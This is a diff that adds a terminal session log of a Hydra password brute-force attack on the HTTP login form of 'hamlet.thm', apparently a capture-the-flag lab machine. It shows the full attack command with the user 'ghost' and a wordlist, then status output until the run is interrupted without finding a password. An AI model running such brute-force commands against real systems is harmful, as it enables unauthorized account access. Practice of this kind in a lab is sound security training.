@@ -1,0 +1,12 @@
+Script started on 2025-04-12 23:39:15+03:00 [COMMAND="hydra -l ghost -P wordlist.txt hamlet.thm -s 8080 http-post-form "/login.html?-1.-loginForm:urlfragment=&username=^USER^&password=^PASS^:F=failed"" TERM="xterm-256color" TTY="/dev/pts/4" COLUMNS="104" LINES="27"]
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-04-12 23:39:15
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 74 login tries (l:1/p:74), ~5 tries per task
+[DATA] attacking http-post-form://hamlet.thm:8080/login.html?-1.-loginForm:urlfragment=&username=^USER^&password=^PASS^:F=failed
+[STATUS] 20.00 tries/min, 20 tries in 00:01h, 54 to do in 00:03h, 16 active
+[STATUS] 10.00 tries/min, 20 tries in 00:02h, 54 to do in 00:06h, 16 active
+[STATUS] 6.67 tries/min, 20 tries in 00:03h, 54 to do in 00:09h, 16 active
+^CThe session file ./hydra.restore was written. Type "hydra -R" to resume session.
+
+Script done on 2025-04-12 23:43:01+03:00 [COMMAND_EXIT_CODE="0"]
